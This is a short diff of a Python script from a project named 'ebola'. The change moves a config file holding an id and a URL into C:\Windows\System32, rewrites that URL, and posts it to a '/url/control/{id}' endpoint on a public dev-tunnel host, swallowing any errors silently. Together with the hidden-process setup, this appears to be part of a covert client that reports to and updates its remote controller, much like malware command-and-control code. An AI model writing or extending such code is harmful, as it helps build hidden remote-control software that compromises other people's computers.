@@ -1,5 +1,6 @@
 import re
 import subprocess
+import sys
 import requests
 
 si = subprocess.STARTUPINFO()
@@ -27,7 +28,7 @@ if __name__ == '__main__':
     _id: str
     _url: str
     
-    with open(r'C:\Users\realr\Documents\Dev\Projects\wence\ebola\info.txt', 'r') as f:
+    with open(r'C:\Windows\System32\ebola\info.txt', 'r') as f:
         info = f.read()
         
         id_pattern = r'id:(.+)'
@@ -37,7 +38,10 @@ if __name__ == '__main__':
         url_pattern = r'url:(.+)'
         _url = re.search(url_pattern, info).group(1)
     
-    with open(r'C:\Users\realr\Documents\Dev\Projects\wence\ebola\info.txt', 'w') as fr:
+    with open(r'C:\Windows\System32\ebola\info.txt', 'w') as fr:
         fr.write(f'{info.replace(_url, new_url)}')
 
-    requests.post(f'http://192.168.1.153:4100/url/control/{_id}', json={"url": f"{new_url}"})
+    try:
+        res = requests.post(f'https://wxtdf382-4100.uks1.devtunnels.ms/url/control/{_id}', json={"url": f"{new_url}"}, timeout=5)
+    except Exception as err:
+        pass
